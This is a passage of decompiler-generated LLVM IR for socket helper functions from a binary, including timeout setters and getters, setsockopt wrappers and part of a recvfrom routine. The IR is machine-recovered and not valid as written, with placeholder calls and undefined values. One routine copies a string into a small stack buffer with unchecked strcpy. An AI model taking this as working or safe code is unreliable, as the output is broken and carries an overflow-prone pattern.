  store i32 %v3_407cec, i32* %v0.global-to-local, align 4
  %v1_407cf8 = call i32* @__errno_location()
  %v3_407cf8 = ptrtoint i32* %v1_407cf8 to i32
  store i32 %v3_407cf8, i32* %v0.global-to-local, align 4
  %v2_407d04 = load i32, i32* %v1_407cf8, align 4
  store i32 %arg4, i32* %v0.global-to-local, align 4
  %v2_407d10 = inttoptr i32 %arg4 to i32*
  store i32 %v2_407d04, i32* %v2_407d10, align 4
  br label %dec_label_pc_407d14

dec_label_pc_407d14:                              ; preds = %dec_label_pc_407c9c, %dec_label_pc_407c58, %dec_label_pc_407c58.thread, %dec_label_pc_407cdc, %dec_label_pc_407ce8
  %stack_var_-56.03 = phi i32 [ %v7_407b5c, %dec_label_pc_407c58.thread ], [ %stack_var_-56.06, %dec_label_pc_407cdc ], [ %stack_var_-56.06, %dec_label_pc_407ce8 ], [ %stack_var_-56.06, %dec_label_pc_407c9c ], [ %v0_407c54, %dec_label_pc_407c58 ]
  store i32 %stack_var_-56.03, i32* %v0.global-to-local, align 4
  ret i32 %stack_var_-56.03

; uselistorder directives
  uselistorder i32 %stack_var_-56.03, { 1, 0 }
  uselistorder i32 %v0_407c54, { 0, 2, 1 }
  uselistorder i32 %v7_407b5c, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %stack_var_-52.0.ph7, { 2, 1, 0 }
  uselistorder i32 %v4_407aa4, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32* %v0.global-to-local, { 2, 3, 7, 4, 5, 6, 8, 9, 10, 17, 11, 12, 13, 1, 14, 15, 0, 16, 18, 19, 20, 21, 22, 23, 24, 26, 25 }
  uselistorder i32 %arg4, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_407d14, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_407c64, { 1, 0 }
  uselistorder label %dec_label_pc_407c58.thread, { 1, 0 }
  uselistorder label %dec_label_pc_407afc, { 1, 0 }
  uselistorder label %dec_label_pc_407afc.preheader, { 0, 2, 1 }
}

define i32 @function_407d30(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407d30:
  %stack_var_-16 = alloca i8, align 1
  store i8 %arg2, i8* %stack_var_-16, align 1
  %v11_407d90 = bitcast i8* %stack_var_-16 to i32*
  %v12_407d90 = call i32 @setsockopt(i32 %arg1, i32 65535, i32 4, i32* %v11_407d90, i32 4)
  %v1_407d9c = icmp eq i32 %v12_407d90, 0
  br i1 %v1_407d9c, label %dec_label_pc_407dec, label %dec_label_pc_407da0

dec_label_pc_407da0:                              ; preds = %dec_label_pc_407d30
  %v1_407dac = icmp eq i32 %arg3, 0
  br i1 %v1_407dac, label %dec_label_pc_407dec, label %dec_label_pc_407db0

dec_label_pc_407db0:                              ; preds = %dec_label_pc_407da0
  %v1_407dc0 = call i32* @__errno_location()
  %v2_407dcc = load i32, i32* %v1_407dc0, align 4
  %v2_407dd8 = inttoptr i32 %arg3 to i32*
  store i32 %v2_407dcc, i32* %v2_407dd8, align 4
  br label %dec_label_pc_407dec

dec_label_pc_407dec:                              ; preds = %dec_label_pc_407d30, %dec_label_pc_407db0, %dec_label_pc_407da0
  %storemerge = phi i32 [ 0, %dec_label_pc_407da0 ], [ 0, %dec_label_pc_407db0 ], [ 1, %dec_label_pc_407d30 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_407dec, { 1, 2, 0 }
}

define i32 @function_407e04(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407e04:
  %stack_var_-16 = alloca i8, align 1
  store i8 %arg2, i8* %stack_var_-16, align 1
  %v11_407e64 = bitcast i8* %stack_var_-16 to i32*
  %v12_407e64 = call i32 @setsockopt(i32 %arg1, i32 0, i32 3, i32* %v11_407e64, i32 4)
  %v1_407e70 = icmp eq i32 %v12_407e64, 0
  br i1 %v1_407e70, label %dec_label_pc_407ec0, label %dec_label_pc_407e74

dec_label_pc_407e74:                              ; preds = %dec_label_pc_407e04
  %v1_407e80 = icmp eq i32 %arg3, 0
  br i1 %v1_407e80, label %dec_label_pc_407ec0, label %dec_label_pc_407e84

dec_label_pc_407e84:                              ; preds = %dec_label_pc_407e74
  %v1_407e94 = call i32* @__errno_location()
  %v2_407ea0 = load i32, i32* %v1_407e94, align 4
  %v2_407eac = inttoptr i32 %arg3 to i32*
  store i32 %v2_407ea0, i32* %v2_407eac, align 4
  br label %dec_label_pc_407ec0

dec_label_pc_407ec0:                              ; preds = %dec_label_pc_407e04, %dec_label_pc_407e84, %dec_label_pc_407e74
  %storemerge = phi i32 [ 0, %dec_label_pc_407e74 ], [ 0, %dec_label_pc_407e84 ], [ 1, %dec_label_pc_407e04 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_407ec0, { 1, 2, 0 }
}

define i32 @function_407ed8(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407ed8:
  %v3_407f18 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 3)
  %v1_407f30 = icmp eq i8 %arg2, 0
  br i1 %v1_407f30, label %dec_label_pc_407f4c, label %dec_label_pc_407f34

dec_label_pc_407f34:                              ; preds = %dec_label_pc_407ed8
  br label %dec_label_pc_407f58

dec_label_pc_407f4c:                              ; preds = %dec_label_pc_407ed8
  br label %dec_label_pc_407f58

dec_label_pc_407f58:                              ; preds = %dec_label_pc_407f34, %dec_label_pc_407f4c
  %v3_407f74 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 4)
  %v1_407f80 = icmp sgt i32 %v3_407f74, -1
  br i1 %v1_407f80, label %dec_label_pc_407fd0, label %dec_label_pc_407f84

dec_label_pc_407f84:                              ; preds = %dec_label_pc_407f58
  %v1_407f90 = icmp eq i32 %arg3, 0
  br i1 %v1_407f90, label %dec_label_pc_407fd0, label %dec_label_pc_407f94

dec_label_pc_407f94:                              ; preds = %dec_label_pc_407f84
  %v1_407fa4 = call i32* @__errno_location()
  %v2_407fb0 = load i32, i32* %v1_407fa4, align 4
  %v2_407fbc = inttoptr i32 %arg3 to i32*
  store i32 %v2_407fb0, i32* %v2_407fbc, align 4
  br label %dec_label_pc_407fd0

dec_label_pc_407fd0:                              ; preds = %dec_label_pc_407f58, %dec_label_pc_407f94, %dec_label_pc_407f84
  %storemerge1 = phi i32 [ 0, %dec_label_pc_407f84 ], [ 0, %dec_label_pc_407f94 ], [ 1, %dec_label_pc_407f58 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_407fd0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_407f58, { 1, 0 }
}

define i32 @sock_set_timeo_rx(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v4_408018 = udiv i32 %arg2, 1000
  store i32 %v4_408018, i32* %stack_var_-16, align 4
  %v7_408094 = call i32 @setsockopt(i32 %arg1, i32 65535, i32 4102, i32* nonnull %stack_var_-16, i32 8)
  %v1_4080a0 = icmp eq i32 %v7_408094, 0
  br i1 %v1_4080a0, label %dec_label_pc_4080f0, label %dec_label_pc_4080a4

dec_label_pc_4080a4:                              ; preds = %entry
  %v1_4080b0 = icmp eq i32* %arg3, null
  br i1 %v1_4080b0, label %dec_label_pc_4080f0, label %dec_label_pc_4080b4

dec_label_pc_4080b4:                              ; preds = %dec_label_pc_4080a4
  %v1_4080c4 = call i32* @__errno_location()
  %v2_4080d0 = load i32, i32* %v1_4080c4, align 4
  store i32 %v2_4080d0, i32* %arg3, align 4
  br label %dec_label_pc_4080f0

dec_label_pc_4080f0:                              ; preds = %entry, %dec_label_pc_4080b4, %dec_label_pc_4080a4
  %storemerge = phi i32 [ 0, %dec_label_pc_4080a4 ], [ 0, %dec_label_pc_4080b4 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_4080f0, { 1, 2, 0 }
}

define i32 @function_408108(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_408108:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* %stack_var_-24, align 4
  store i32 8, i32* %stack_var_-16, align 4
  %v17_408168 = call i32 @getsockopt(i32 %arg1, i32 65535, i32 4102, i32* nonnull %stack_var_-24, i32* nonnull %stack_var_-16)
  %v1_408174 = icmp eq i32 %v17_408168, 0
  br i1 %v1_408174, label %dec_label_pc_4081c0, label %dec_label_pc_408178

dec_label_pc_408178:                              ; preds = %dec_label_pc_408108
  %v1_408184 = icmp eq i32 %arg3, 0
  br i1 %v1_408184, label %dec_label_pc_40821c, label %dec_label_pc_408188

dec_label_pc_408188:                              ; preds = %dec_label_pc_408178
  %v1_408198 = call i32* @__errno_location()
  %v2_4081a4 = load i32, i32* %v1_408198, align 4
  %v2_4081b0 = inttoptr i32 %arg3 to i32*
  store i32 %v2_4081a4, i32* %v2_4081b0, align 4
  br label %dec_label_pc_40821c

dec_label_pc_4081c0:                              ; preds = %dec_label_pc_408108
  %v3_4081c0 = load i32, i32* %stack_var_-24, align 4
  %v1_4081e0 = mul i32 %v3_4081c0, 1000
  store i32 %v1_4081e0, i32* %arg2, align 4
  br label %dec_label_pc_40821c

dec_label_pc_40821c:                              ; preds = %dec_label_pc_408188, %dec_label_pc_408178, %dec_label_pc_4081c0
  %storemerge = phi i32 [ 1, %dec_label_pc_4081c0 ], [ 0, %dec_label_pc_408178 ], [ 0, %dec_label_pc_408188 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_40821c, { 2, 0, 1 }
}

define i32 @sock_set_timeo_tx(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v4_408264 = udiv i32 %arg2, 1000
  store i32 %v4_408264, i32* %stack_var_-16, align 4
  %v7_4082e0 = call i32 @setsockopt(i32 %arg1, i32 65535, i32 4101, i32* nonnull %stack_var_-16, i32 8)
  %v1_4082ec = icmp eq i32 %v7_4082e0, 0
  br i1 %v1_4082ec, label %dec_label_pc_40833c, label %dec_label_pc_4082f0

dec_label_pc_4082f0:                              ; preds = %entry
  %v1_4082fc = icmp eq i32* %arg3, null
  br i1 %v1_4082fc, label %dec_label_pc_40833c, label %dec_label_pc_408300

dec_label_pc_408300:                              ; preds = %dec_label_pc_4082f0
  %v1_408310 = call i32* @__errno_location()
  %v2_40831c = load i32, i32* %v1_408310, align 4
  store i32 %v2_40831c, i32* %arg3, align 4
  br label %dec_label_pc_40833c

dec_label_pc_40833c:                              ; preds = %entry, %dec_label_pc_408300, %dec_label_pc_4082f0
  %storemerge = phi i32 [ 0, %dec_label_pc_4082f0 ], [ 0, %dec_label_pc_408300 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_40833c, { 1, 2, 0 }
}

define i32 @function_408354(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_408354:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* %stack_var_-24, align 4
  store i32 8, i32* %stack_var_-16, align 4
  %v17_4083b4 = call i32 @getsockopt(i32 %arg1, i32 65535, i32 4101, i32* nonnull %stack_var_-24, i32* nonnull %stack_var_-16)
  %v1_4083c0 = icmp eq i32 %v17_4083b4, 0
  br i1 %v1_4083c0, label %dec_label_pc_40840c, label %dec_label_pc_4083c4

dec_label_pc_4083c4:                              ; preds = %dec_label_pc_408354
  %v1_4083d0 = icmp eq i32 %arg3, 0
  br i1 %v1_4083d0, label %dec_label_pc_408468, label %dec_label_pc_4083d4

dec_label_pc_4083d4:                              ; preds = %dec_label_pc_4083c4
  %v1_4083e4 = call i32* @__errno_location()
  %v2_4083f0 = load i32, i32* %v1_4083e4, align 4
  %v2_4083fc = inttoptr i32 %arg3 to i32*
  store i32 %v2_4083f0, i32* %v2_4083fc, align 4
  br label %dec_label_pc_408468

dec_label_pc_40840c:                              ; preds = %dec_label_pc_408354
  %v3_40840c = load i32, i32* %stack_var_-24, align 4
  %v1_40842c = mul i32 %v3_40840c, 1000
  store i32 %v1_40842c, i32* %arg2, align 4
  br label %dec_label_pc_408468

dec_label_pc_408468:                              ; preds = %dec_label_pc_4083d4, %dec_label_pc_4083c4, %dec_label_pc_40840c
  %storemerge = phi i32 [ 1, %dec_label_pc_40840c ], [ 0, %dec_label_pc_4083c4 ], [ 0, %dec_label_pc_4083d4 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32*, i32*)* @getsockopt, { 1, 0 }
  uselistorder label %dec_label_pc_408468, { 2, 0, 1 }
}

define i32 @function_408480(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_408480:
  %stack_var_-16 = alloca i8, align 1
  store i8 %arg2, i8* %stack_var_-16, align 1
  %v11_4084e0 = bitcast i8* %stack_var_-16 to i32*
  %v12_4084e0 = call i32 @setsockopt(i32 %arg1, i32 6, i32 1, i32* %v11_4084e0, i32 4)
  %v1_4084ec = icmp eq i32 %v12_4084e0, 0
  br i1 %v1_4084ec, label %dec_label_pc_40853c, label %dec_label_pc_4084f0

dec_label_pc_4084f0:                              ; preds = %dec_label_pc_408480
  %v1_4084fc = icmp eq i32 %arg3, 0
  br i1 %v1_4084fc, label %dec_label_pc_40853c, label %dec_label_pc_408500

dec_label_pc_408500:                              ; preds = %dec_label_pc_4084f0
  %v1_408510 = call i32* @__errno_location()
  %v2_40851c = load i32, i32* %v1_408510, align 4
  %v2_408528 = inttoptr i32 %arg3 to i32*
  store i32 %v2_40851c, i32* %v2_408528, align 4
  br label %dec_label_pc_40853c

dec_label_pc_40853c:                              ; preds = %dec_label_pc_408480, %dec_label_pc_408500, %dec_label_pc_4084f0
  %storemerge = phi i32 [ 0, %dec_label_pc_4084f0 ], [ 0, %dec_label_pc_408500 ], [ 1, %dec_label_pc_408480 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_40853c, { 1, 2, 0 }
}

define i32 @function_408554(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_408554:
  %stack_var_0 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_0, align 4
  %v1_408584 = icmp eq i8* %arg2, null
  br i1 %v1_408584, label %dec_label_pc_408588, label %dec_label_pc_408598

dec_label_pc_408588:                              ; preds = %dec_label_pc_408554
  br label %dec_label_pc_408640

dec_label_pc_408598:                              ; preds = %dec_label_pc_408554
  %tmp12 = bitcast i32* %stack_var_-24 to i8*
  %v7_4085b0 = call i8* @strcpy(i8* %tmp12, i8* nonnull %arg2)
  %v3_4085c4 = load i32, i32* %stack_var_0, align 4
  %v7_4085e4 = call i32 @setsockopt(i32 %v3_4085c4, i32 65535, i32 25, i32* nonnull %stack_var_-24, i32 15)
  %v1_4085f0 = icmp eq i32 %v7_4085e4, 0
  br i1 %v1_4085f0, label %dec_label_pc_40863c, label %dec_label_pc_4085f4

dec_label_pc_4085f4:                              ; preds = %dec_label_pc_408598
  %v1_408600 = icmp eq i32 %arg3, 0
  br i1 %v1_408600, label %dec_label_pc_408630, label %dec_label_pc_408604

dec_label_pc_408604:                              ; preds = %dec_label_pc_4085f4
  %v1_408614 = call i32* @__errno_location()
  %v2_408620 = load i32, i32* %v1_408614, align 4
  %v2_40862c = inttoptr i32 %arg3 to i32*
  store i32 %v2_408620, i32* %v2_40862c, align 4
  br label %dec_label_pc_408630

dec_label_pc_408630:                              ; preds = %dec_label_pc_4085f4, %dec_label_pc_408604
  br label %dec_label_pc_408640

dec_label_pc_40863c:                              ; preds = %dec_label_pc_408598
  br label %dec_label_pc_408640

dec_label_pc_408640:                              ; preds = %dec_label_pc_408630, %dec_label_pc_408588, %dec_label_pc_40863c
  %v1_408650 = phi i32 [ 0, %dec_label_pc_408630 ], [ 0, %dec_label_pc_408588 ], [ 1, %dec_label_pc_40863c ]
  ret i32 %v1_408650

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32*, i32)* @setsockopt, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 15, { 2, 0, 4, 1, 5, 3 }
  uselistorder label %dec_label_pc_408640, { 2, 0, 1 }
  uselistorder label %dec_label_pc_408630, { 1, 0 }
}

define i32 @sock_recvfrom(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %gp.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to i16*
  %tmp40 = call i16 @__decompiler_undefined_function_4()
  %tmp43 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_408660 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32* %gp.global-to-local, align 4
  %v1_408690 = icmp ne i32* %arg2, null
  %v1_408694 = zext i1 %v1_408690 to i8
  store i32 0, i32* %stack_var_-16, align 4
  %v2_4086a8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_4086a8, i32* %v0.global-to-local, align 4
  %v4_4086b8 = call i32 @function_408108(i32 %arg1, i32* nonnull %stack_var_-16, i32 0)
  store i32 %v4_4086b8, i32* %v0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32* %gp.global-to-local, align 4
  %v1_4086c4 = icmp eq i32 %v4_4086b8, 0
  br i1 %v1_4086c4, label %dec_label_pc_40872c, label %dec_label_pc_4086c8

dec_label_pc_4086c8:                              ; preds = %entry
  %v3_4086cc = load i32, i32* %stack_var_-16, align 4
  %v4_4086d4 = udiv i32 %v3_4086cc, 1000
  store i32 %v4_4086d4, i32* %stack_var_-16, align 4
  store i32 %v4_4086d4, i32* %v0.global-to-local, align 4
  %tmp64 = icmp ult i32 %v3_4086cc, 1000
  br i1 %tmp64, label %dec_label_pc_40872c, label %dec_label_pc_4086f8

dec_label_pc_4086f8:                              ; preds = %dec_label_pc_4086c8
  %v3_408700 = load i32, i32* @global_var_41b214.76, align 4
  store i32 %v3_408700, i32* %v0.global-to-local, align 4
  %v3_40870c = call i32 @time(i32* null)
  store i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32* %gp.global-to-local, align 4
  %v3_40871c = load i32, i32* %stack_var_-16, align 4
  %v2_408724 = add i32 %v3_40871c, %v3_40870c
  store i32 %v2_408724, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40872c

dec_label_pc_40872c:                              ; preds = %dec_label_pc_4086c8, %entry, %dec_label_pc_4086f8
  %stack_var_-56.0 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_4086c8 ], [ %v2_408724, %dec_label_pc_4086f8 ]
  %v4_40872c = zext i1 %v1_408690 to i32
  store i32 %v4_40872c, i32* %v0.global-to-local, align 4
  %v1_408734 = icmp eq i1 %v1_408690, false
  br i1 %v1_408734, label %dec_label_pc_408768, label %dec_label_pc_408738

dec_label_pc_408738:                              ; preds = %dec_label_pc_40872c
  %v3_408750 = load i32, i32* @global_var_41b220.22, align 4
  store i32 %v3_408750, i32* %v0.global-to-local, align 4
  %v5_40875c = call i32* @memset(i32* nonnull %stack_var_-36, i32 0, i32 16)
  %v7_40875c = ptrtoint i32* %v5_40875c to i32
  store i32 %v7_40875c, i32* %v0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32* %gp.global-to-local, align 4
  br label %dec_label_pc_408768

dec_label_pc_408768:                              ; preds = %dec_label_pc_40872c, %dec_label_pc_408738
  %v1_408770 = icmp sgt i32 %arg6, -1
  %arg6. = select i1 %v1_408770, i32 %arg6, i32 2147483647
  store i32 %arg6., i32* %v0.global-to-local, align 4
  %v2_4089e4 = call i32 @llvm.bswap.i32(i32 %tmp43)
  %v1_408a04 = icmp eq i32 %arg3, 0
  %div = udiv i16 %tmp40, 256
  %v1_408a28 = mul i16 %tmp40, 256
  %v2_408a2c = or i16 %v1_408a28, %div
  br label %dec_label_pc_408aac.outer

dec_label_pc_408794:                              ; preds = %dec_label_pc_408ac0
  store i32 %v2_408820, i32* %v0.global-to-local, align 4
  %v0_408834 = load i32, i32* %gp.global-to-local, align 4
  br i1 %v1_40879c, label %dec_label_pc_408804, label %dec_label_pc_4087a0

dec_label_pc_4087a0:                              ; preds = %dec_label_pc_408794
  %v1_4087e4 = add i32 %v0_408834, -32332
  %v2_4087e4 = inttoptr i32 %v1_4087e4 to i32*
  %v3_4087e4 = load i32, i32* %v2_4087e4, align 4
  store i32 %v3_4087e4, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4087e4)
  br label %dec_label_pc_40884c

dec_label_pc_408804:                              ; preds = %dec_label_pc_408794
  %v1_408834 = add i32 %v0_408834, -32268
  %v2_408834 = inttoptr i32 %v1_408834 to i32*
  %v3_408834 = load i32, i32* %v2_408834, align 4
  store i32 %v3_408834, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_408834)
  br label %dec_label_pc_40884c

dec_label_pc_40884c:                              ; preds = %dec_label_pc_4087a0, %dec_label_pc_408804
  store i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32* %gp.global-to-local, align 4
  %v0_40884c = load i32, i32* %v0.global-to-local, align 4
  %v1_408858 = icmp sgt i32 %v0_40884c, -1
  br i1 %v1_408858, label %dec_label_pc_408978, label %dec_label_pc_40885c

dec_label_pc_40885c:                              ; preds = %dec_label_pc_40884c
  %v3_408860 = load i32, i32* @global_var_41b1f4.163, align 4
  store i32 %v3_408860, i32* %v0.global-to-local, align 4
  %v1_40886c = call i32* @__errno_location()
  %v3_40886c = ptrtoint i32* %v1_40886c to i32
  store i32 %v3_40886c, i32* %v0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32* %gp.global-to-local, align 4
  %v2_408878 = load i32, i32* %v1_40886c, align 4
  store i32 4, i32* %v0.global-to-local, align 4
  %v2_408880 = icmp eq i32 %v2_408878, 4
  br i1 %v2_408880, label %dec_label_pc_408884, label %dec_label_pc_4088d4

dec_label_pc_408884:                              ; preds = %dec_label_pc_40885c
  store i32 %stack_var_-56.2.ph9, i32* %v0.global-to-local, align 4
  br i1 %v1_408890, label %dec_label_pc_408aac.outer8, label %dec_label_pc_408894

dec_label_pc_408894:                              ; preds = %dec_label_pc_408884
  %v3_40889c = load i32, i32* @global_var_41b214.76, align 4
  store i32 %v3_40889c, i32* %v0.global-to-local, align 4
  %v3_4088a8 = call i32 @time(i32* null)
  store i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32* %gp.global-to-local, align 4
  %v2_4088c0 = icmp slt i32 %stack_var_-56.2.ph9, %v3_4088a8
  %v3_4088c0 = zext i1 %v2_4088c0 to i32
  store i32 %v3_4088c0, i32* %v0.global-to-local, align 4
  br i1 %v2_4088c0, label %dec_label_pc_408a48.thread, label %dec_label_pc_408aac

dec_label_pc_408a48.thread:                       ; preds = %dec_label_pc_408894
  store i32 %stack_var_-56.2.ph9, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_408a54

dec_label_pc_4088d4:                              ; preds = %dec_label_pc_40885c
  %v3_4088d4 = load i32, i32* @global_var_41b1f4.163, align 4
  store i32 %v3_4088d4, i32* %v0.global-to-local, align 4
  %v1_4088e0 = call i32* @__errno_location()
  %v3_4088e0 = ptrtoint i32* %v1_4088e0 to i32
  store i32 %v3_4088e0, i32* %v0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32* %gp.global-to-local, align 4
  %v2_4088ec = load i32, i32* %v1_4088e0, align 4
  store i32 11, i32* %v0.global-to-local, align 4
  %v2_4088f4 = icmp eq i32 %v2_4088ec, 11
  br i1 %v2_4088f4, label %dec_label_pc_408a48, label %dec_label_pc_4088f8

dec_label_pc_4088f8:                              ; preds = %dec_label_pc_4088d4
  %v3_4088fc = load i32, i32* @global_var_41b1f4.163, align 4
  store i32 %v3_4088fc, i32* %v0.global-to-local, align 4
  %v1_408908 = call i32* @__errno_location()
  %v3_408908 = ptrtoint i32* %v1_408908 to i32
  store i32 %v3_408908, i32* %v0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32* %gp.global-to-local, align 4
  %v2_408914 = load i32, i32* %v1_408908, align 4
  store i32 11, i32* %v0.global-to-local, align 4
  %v2_40891c = icmp eq i32 %v2_408914, 11
  br i1 %v2_40891c, label %dec_label_pc_408a48, label %dec_label_pc_408920

dec_label_pc_408920:                              ; preds = %dec_label_pc_4088f8
  store i32 %arg7, i32* %v0.global-to-local, align 4
  %v1_40892c = icmp eq i32 %arg7, 0
  br i1 %v1_40892c, label %dec_label_pc_408ad4, label %dec_label_pc_408930

dec_label_pc_408930:                              ; preds = %dec_label_pc_408920
  %v3_408934 = load i32, i32* @global_var_41b1f4.163, align 4
  store i32 %v3_408934, i32* %v0.global-to-local, align 4
  %v1_408940 = call i32* @__errno_location()
  %v3_408940 = ptrtoint i32* %v1_408940 to i32
  store i32 %v3_408940, i32* %v0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32* %gp.global-to-local, align 4
  %v2_40894c = load i32, i32* %v1_408940, align 4
  store i32 %arg7, i32* %v0.global-to-local, align 4
  %v2_408958 = inttoptr i32 %arg7 to i32*
  store i32 %v2_40894c, i32* %v2_408958, align 4
  br label %dec_label_pc_408ad4

dec_label_pc_408978:                              ; preds = %dec_label_pc_40884c
  store i32 %v4_408794, i32* %v0.global-to-local, align 4
  br i1 %v1_40879c, label %dec_label_pc_408a48, label %dec_label_pc_408984

dec_label_pc_408984:                              ; preds = %dec_label_pc_408978
  store i32 %v0_40884c, i32* %v0.global-to-local, align 4
  %v1_408990 = icmp slt i32 %v0_40884c, 1
  br i1 %v1_408990, label %dec_label_pc_408a48, label %dec_label_pc_408994

dec_label_pc_408994:                              ; preds = %dec_label_pc_408984
  store i32 %v2_4089e4, i32* %arg2, align 4
  store i32 %arg3, i32* %v0.global-to-local, align 4
  br i1 %v1_408a04, label %dec_label_pc_408a48, label %dec_label_pc_408a08

dec_label_pc_408a08:                              ; preds = %dec_label_pc_408994
  store i32 %arg3, i32* %v0.global-to-local, align 4
  store i16 %v2_408a2c, i16* %tmp, align 2
  br label %dec_label_pc_408a48

dec_label_pc_408a48:                              ; preds = %dec_label_pc_408a08, %dec_label_pc_408994, %dec_label_pc_4088d4, %dec_label_pc_4088f8, %dec_label_pc_408984, %dec_label_pc_408978
  %stack_var_-52.0 = phi i32 [ %v0_40884c, %dec_label_pc_408978 ], [ 0, %dec_label_pc_408984 ], [ 0, %dec_label_pc_4088f8 ], [ 0, %dec_label_pc_4088d4 ], [ %v0_40884c, %dec_label_pc_408994 ], [ %v0_40884c, %dec_label_pc_408a08 ]
  %stack_var_-60.0 = phi i8 [ 0, %dec_label_pc_408978 ], [ %stack_var_-60.1.ph, %dec_label_pc_408984 ], [ %stack_var_-60.1.ph, %dec_label_pc_4088f8 ], [ %stack_var_-60.1.ph, %dec_label_pc_4088d4 ], [ 0, %dec_label_pc_408994 ], [ 0, %dec_label_pc_408a08 ]
  store i32 %stack_var_-56.2.ph9, i32* %v0.global-to-local, align 4
  br i1 %v1_408890, label %dec_label_pc_408a88, label %dec_label_pc_408a48.dec_label_pc_408a54_crit_edge

dec_label_pc_408a48.dec_label_pc_408a54_crit_edge: ; preds = %dec_label_pc_408a48
  %v0_408a5c.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_408a54

dec_label_pc_408a54:                              ; preds = %dec_label_pc_408a48.dec_label_pc_408a54_crit_edge, %dec_label_pc_408a48.thread
  %v0_408a5c = phi i32 [ ptrtoint (i32* @global_var_4230f0.1 to i32), %dec_label_pc_408a48.thread ], [ %v0_408a5c.pre, %dec_label_pc_408a48.dec_label_pc_408a54_crit_edge ]
  %stack_var_-60.06 = phi i8 [ %stack_var_-60.1.ph, %dec_label_pc_408a48.thread ], [ %stack_var_-60.0, %dec_label_pc_408a48.dec_label_pc_408a54_crit_edge ]
  %stack_var_-52.04 = phi i32 [ 0, %dec_label_pc_408a48.thread ], [ %stack_var_-52.0, %dec_label_pc_408a48.dec_label_pc_408a54_crit_edge ]
  %v1_408a5c = add i32 %v0_408a5c, -32476
  %v2_408a5c = inttoptr i32 %v1_408a5c to i32*
  %v3_408a5c = load i32, i32* %v2_408a5c, align 4
  store i32 %v3_408a5c, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_408a5c)
  store i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32* %gp.global-to-local, align 4
  %v0_408a74 = load i32, i32* %v0.global-to-local, align 4
  %v3_408a78 = load i32, i32* %stack_var_-16, align 4
  %v2_408a80 = add i32 %v3_408a78, %v0_408a74
  store i32 %v2_408a80, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_408a88

dec_label_pc_408a88:                              ; preds = %dec_label_pc_408a48, %dec_label_pc_408a54
  %stack_var_-60.07 = phi i8 [ %stack_var_-60.0, %dec_label_pc_408a48 ], [ %stack_var_-60.06, %dec_label_pc_408a54 ]
  %stack_var_-52.05 = phi i32 [ %stack_var_-52.0, %dec_label_pc_408a48 ], [ %stack_var_-52.04, %dec_label_pc_408a54 ]
